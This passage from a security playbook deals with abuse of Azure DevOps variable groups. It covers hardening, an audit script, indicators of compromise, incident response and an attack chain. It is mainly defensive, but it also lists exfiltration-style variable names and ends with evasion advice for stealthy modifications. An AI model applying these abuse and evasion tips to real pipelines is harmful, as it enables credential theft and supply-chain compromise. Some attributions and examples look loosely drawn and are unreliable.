  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Variable Group Modifications to Corporate Network`
  4. **Assignments:**
     - Users: Pipeline Service Accounts, Admins
     - Cloud apps: **Azure DevOps**
  5. **Conditions:**
     - Locations: **Exclude corporate IP ranges**
  6. **Access controls:**
     - Grant: **Require device to be marked as compliant** + **Require MFA**
  7. Enable policy: **On**

---

### Access Control & Policy Hardening

* **Role-Based Access Control (RBAC):**
  - **Variable Group User:** Can view and use variables in authorized pipelines only
  - **Variable Group Administrator:** Can modify group, but ONLY after approval
  - **Variable Group Security Admin:** Can manage permissions (separate from modification)
  
  **Manual Implementation:**
  1. Go to **Project Settings** → **Permissions**
  2. Create custom roles (if supported) or use security groups
  3. Assign roles with least privilege principle

* **Service Principal Ownership Restrictions:**
  - Service principals that own Key Vault integrations should have:
    - Minimal Azure RBAC roles (not Contributor/Owner)
    - Specific Key Vault permissions (Get, List only)
    - No ability to modify their own permissions
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Subscription** → **Access Control (IAM)**
  2. Find the service principal used by Azure DevOps
  3. Reduce role to **Reader** or custom role with minimal permissions
  4. Go to **Key Vault** → **Access policies**
  5. Remove unnecessary permissions (e.g., Delete, Purge)

---

### Validation Command (Verify Mitigations)

**PowerShell - Check Variable Group Security Configuration:**

```powershell
# List all variable groups and their security posture
$allGroups = (Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups" -Headers $headers -Method Get).value

Write-Host "Variable Group Security Audit:"
Write-Host "==============================`n"

foreach ($group in $allGroups) {
    Write-Host "Group: $($group.name)"
    
    # Check if "Allow access to all pipelines" is enabled
    if ($group.authorizedResources.Count -eq 0 -or $group.authorizedResources[0].id -like "*all*") {
        Write-Host "  ❌ WARNING: Authorized for ALL pipelines"
    } else {
        Write-Host "  ✓ Authorized pipelines: $($group.authorizedResources.Count)"
    }
    
    # Check secret variables
    $secretCount = ($group.variables.Values | Where-Object { $_.isSecret -eq $true } | Measure-Object).Count
    Write-Host "  Secrets: $secretCount (should be encrypted)"
    
    # Check if Key Vault linked
    if ($group.type -eq "AzureKeyVault") {
        Write-Host "  ✓ Linked to Key Vault: $($group.providerData.vault)"
    }
    
    Write-Host ""
}
```

**Expected Output (If Secure):**

```
Variable Group Security Audit:
==============================

Group: prod-secrets
  ✓ Authorized pipelines: 1
  Secrets: 5 (should be encrypted)
  ✓ Linked to Key Vault: prod-keyvault

Group: dev-secrets
  ✓ Authorized pipelines: 3
  Secrets: 2 (should be encrypted)
```

---

## 9. Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Audit Log Patterns:**
  - `Update variable group` action with `secret` in properties
  - Bulk modifications to variable groups in short timeframe
  - `Modify variable group security` by unexpected user
  - Changes to "Allow access to all pipelines" setting

* **Behavioral Patterns:**
  - User normally with read-only access suddenly modifying variables
  - Service account accessing variable groups from new IP
  - Variable group access outside normal business hours
  - Rapid enumeration of multiple variable groups via REST API

* **Files/Artifacts (Post-Exploitation):**
  - Newly created variable with suspicious name: `EXFIL_ENDPOINT`, `BACKDOOR_URL`, `STEAL_*`
  - Modified secret values that don't match expected format
  - New pipelines created with odd names (e.g., `test-pipeline-x`, `cleanup-job`)

---

### Forensic Artifacts

* **Cloud (Azure DevOps / Sentinel):**
  - **AuditLogs table:** Modification history, who changed what, when
  - **Activity entities:** Exact changes made to variables
  - **Timeline:** Modification timestamp chain

* **REST API Artifacts:**
  - Variable group history (last N versions accessible via API)
  - Service connection modification logs
  - Permission change logs

---

### Response Procedures

1. **Isolate:**
   
   **Immediate Actions:**
   ```powershell
   # Revoke PAT tokens of suspicious users
   $susUser = "attacker@company.com"
   # (No direct revoke API; must be done via UI or PowerShell module)
   
   # Disable variable group temporarily
   $groupId = 1
   $group = Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups/$groupId" -Headers $headers -Method Get
   $group.variables = @{}  # Clear all variables temporarily
   Invoke-RestMethod -Uri "$orgUrl/$project/_apis/distributedtask/variablegroups/$groupId" -Headers $headers -Method Put -Body ($group | ConvertTo-Json) -ContentType "application/json"
   ```
   
   **Manual (Azure Portal):**
   1. Go to **Pipelines** → **Library** → Select group
   2. Temporarily change all secret values to dummy values
   3. Click **Save**
   4. Notify pipeline owners: Group is disabled for investigation

2. **Collect Evidence:**
   
   **Command (Export Audit Logs):**
   ```powershell
   # Export audit logs for variable group modifications
   # (Use Azure DevOps audit export API or portal)
   $auditQuery = @{
       "searchText" = "variable group"
       "startDate" = (Get-Date).AddDays(-7)
       "endDate" = Get-Date
   }
   # Use Audit Log API to export
   ```
   
   **Manual (Azure Portal):**
   1. Go to **Organization Settings** → **Audit**
   2. Filter by **Activity**: "Update variable group", "Delete variable group"
   3. Download CSV export
   4. Save to secure forensic storage

3. **Remediate:**
   
   **Steps:**
   1. **Restore from backup:** If variable group version history available, restore to known-good state
   2. **Rotate credentials:** Reset all secrets exposed in compromised group
   3. **Revoke access:** Remove attacker account from security groups
   4. **Reauthorize pipelines:** After secrets rotated, re-authorize pipelines
   5. **Review permissions:** Audit and tighten variable group access controls
   
   **Command (Restore Variables):**
   ```powershell
   # If you have a backup of previous variable state
   $knownGoodVariables = @{
       "DATABASE_PASSWORD" = @{isSecret = $true; value = "NewSecurePassword123!"}
       "API_KEY" = @{isSecret = $true; value = "NewApiKey456!"}
   }
   # Restore to group
   ```

4. **Escalate:**
   
   **Notify:**
   - Security team
   - DevOps leadership
   - Any affected application owners
   - Compliance team (potential breach reporting)
   
   **Incident Report Should Include:**
   - What variable groups were modified
   - Which secrets were exposed/changed
   - Timeline of modification
   - Which pipelines/applications were affected
   - Downstream impact (containers, packages, artifacts released)

---

## 10. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1199 - Trusted Relationship](https://attack.mitre.org/techniques/T1199/) | Compromised developer account or stolen PAT |
| **2** | **Reconnaissance** | [T1087 - Account Discovery](https://attack.mitre.org/techniques/T1087/) | Enumerate variable groups and permissions |
| **3** | **Privilege Escalation** | [T1078 - Valid Accounts](https://attack.mitre.org/techniques/T1078/) | Join security group with admin access to variable groups |
| **4** | **Credential Access** | **[CA-UNSC-016] Variable Groups Abuse** | Modify or extract secrets from variable groups |
| **5** | **Lateral Movement** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) | Use stolen credentials to access downstream systems |
| **6** | **Persistence** | [T1537 - Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537/) | Exfiltrate credentials; establish persistent C2 |
| **7** | **Impact** | Supply Chain Attack | Poison build artifacts; compromise thousands of consumers |

---

## 11. Real-World Examples

### Example 1: Lazarus Group - Supply Chain Attack via DevOps (2024-2025)

- **Target:** Software development organizations globally
- **Timeline:** Ongoing (2024-2025)
- **Technique Status:** ACTIVE
- **APT Attribution:** Lazarus Group (North Korea)
- **Attack Details:**
  - Compromised developer accounts via spear-phishing
  - Accessed Azure DevOps pipelines and variable groups
  - Modified variable groups used by build pipelines
  - Injected malicious environment variables that executed in build agents
  - Poisoned compiled binaries and container images
  - Artifacts propagated to thousands of downstream developers
- **Impact:** Estimated thousands of compromised dev environments; supply chain contamination
- **Key Lesson:** Variable group modifications don't require complex exploitation; simple credential compromise is enough
- **Reference:** [Cyberpress: Lazarus APT targets CI/CD pipelines](https://cyberpress.org/north-korean-apt-targets-ci-cd-pipelines/)

---

### Example 2: npm Ecosystem Attack - Variable Group Secret Exfiltration (2025)

- **Target:** npm open-source developers (36,000+ packages)
- **Timeline:** January-February 2025
- **Technique Status:** ACTIVE
- **Attacker:** Unknown (possibly nation-state or APT)
- **Attack Details:**
  - Malicious npm packages installed in developer environments
  - Packages enumerated variable groups from local CI/CD systems
  - Extracted GitHub tokens, npm PATs, AWS credentials from variable groups
  - Established persistence and lateral movement
- **Impact:** 36,000+ packages potentially compromised; downstream users at risk
- **Reference:** [About GitLab: Widespread npm supply chain attack](https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/)

---

### Example 3: Internal Threat - Insider Abuse of Variable Group Admin Access

- **Target:** Financial services company (2023)
- **Timeline:** March 2023
- **Scenario:** Disgruntled DevOps engineer with variable group admin access
- **Attack Details:**
  - Employee scheduled to be terminated
  - Used admin access to modify production database credentials in variable group
  - Injected code into build pipeline to exfiltrate customer data
  - Poisoned application artifacts
  - Customer data leaked to attacker's infrastructure
- **Impact:** PCI-DSS violation; customer data breach; regulatory fines
- **Key Lesson:** Insiders with legitimate access are hardest to detect; approval workflows and separation of duties essential
- **Mitigation That Failed:** No approval workflow for variable group changes; no audit alerts triggered

---

## 12. ATTACK VARIATIONS & VERSION-SPECIFIC NOTES

### Azure DevOps Server 2016-2019

**Differences:**
- Limited audit logging for variable group changes
- No native integration with Entra ID for group management
- Permission model less mature (inheritance less clear)

**Exploitation:**
- Easier to gain variable group admin access due to weak permission reviews
- Changes to variable groups are not well-logged
- Detection significantly weaker

---

### Azure DevOps Server 2022+

**Differences:**
- Enhanced audit logging
- Better Entra ID integration
- Improved permission inheritance model

**Exploitation:**
- Same techniques work, but modifications are better-logged
- Timing and stealth become more important
- Detection systems (if enabled) are more effective

---

### Azure DevOps Services (Cloud)

**Differences:**
- Real-time audit logging to Azure activity logs
- Sentinel integration available
- Microsoft actively monitors for abuse patterns

**Best Detection:** Cloud-based anomaly detection (Sentinel)

**Best Evasion:** Small, infrequent changes; use legitimate-sounding variable names

---